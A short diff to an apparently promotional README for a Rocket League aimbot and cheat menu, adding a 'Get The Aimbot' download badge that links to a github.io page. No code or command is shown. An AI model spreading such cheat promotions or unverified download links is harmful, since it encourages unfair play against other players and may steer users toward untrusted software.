@@ -4,7 +4,7 @@
 
 Rocket League aimbot is the holy grail for players who want to land every strike and aerial without grinding for years. With goal assist, auto-alignment, and cheat menu hacks, you can control the ball like never before.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Aimbot-blueviolet)](https://rocket-league-aimbot.github.io/.github/)
 ---
 
 ## Product Description
